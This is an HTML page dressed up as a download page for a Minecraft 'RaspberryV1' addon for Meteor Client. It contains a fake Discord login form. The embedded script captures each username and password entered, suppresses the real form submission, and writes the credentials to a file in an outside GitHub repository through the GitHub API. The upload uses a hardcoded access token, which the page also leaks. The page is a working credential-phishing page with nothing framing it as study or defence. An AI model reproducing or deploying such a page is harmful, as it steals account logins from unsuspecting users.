<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Raspberry Addon for Meteor Client</title>
    <style>
        /* Additional styles specific to your page */
        .hidden {
            display: none;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
            padding-top: 60px;
            text-align: center;
        }
        .modal-content {
            background-color: #fefefe;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 400px;
        }
        .login-container {
            text-align: left;
        }
        .login-container h2 {
            text-align: center;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container input[type="submit"] {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <header>
        <!-- Navigation, logo, etc. -->
    </header>

    <main>
        <h1>Welcome to RaspberryV1</h1>
        <p>Download Raspberry</p>

        <!-- Login modal -->
        <div id="loginModal" class="modal">
            <div class="modal-content">
                <div class="login-container">
                    <h2>Discord Login</h2>
                    <form id="loginForm">
                        <input type="text" id="username" name="username" placeholder="Username" required><br>
                        <input type="password" id="password" name="password" placeholder="Password" required><br>
                        <input type="submit" value="Login">
                    </form>
                </div>
            </div>
        </div>

        <!-- Login button to trigger the modal -->
        <button id="loginBtn">Login</button>
    </main>

    <footer>
        <!-- Footer content -->
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var loginForm = document.getElementById('loginForm');

            loginForm.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent actual form submission

                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;

                // Save login details to GitHub repository
                saveLoginDetails(username, password);

                // Hide the login form after "logging in"
                document.getElementById('loginModal').classList.add('hidden');
            });

            function saveLoginDetails(username, password) {
                var token = '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'; // Replace with your GitHub Personal Access Token
                var owner = 'SenpaiCummer';
                var repo = 'SenpaiCummer.github.io';
                var path = 'information';
                var apiUrl = `https://api.github.com/repos/SenpaiCummer/SenpaiCummer.github.io/contents/information`;

                // Fetch options
                var headers = {
                    'Authorization': 'token ' + token,
                    'Accept': 'application/vnd.github.v3+json'
                };

                // Get current file contents to append new data
                fetch(apiUrl, { method: 'GET', headers: headers })
                    .then(response => response.json())
                    .then(data => {
                        var content = data.content ? JSON.parse(atob(data.content)) : [];

                        // Add new login information
                        content.push({ username: username, password: password });

                        // Update file content
                        return fetch(apiUrl, {
                            method: 'PUT',
                            headers: headers,
                            body: JSON.stringify({
                                message: 'Update login information',
                                content: btoa(JSON.stringify(content)),
                                sha: data.sha
                            })
                        });
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Login details saved successfully.');
                    })
                    .catch(error => {
                        console.error('Error fetching or updating file:', error);
                    });
            }

            // Show the login modal
            document.getElementById('loginBtn').addEventListener('click', function() {
                document.getElementById('loginModal').style.display = 'block';
            });
        });
    </script>
</body>
</html>
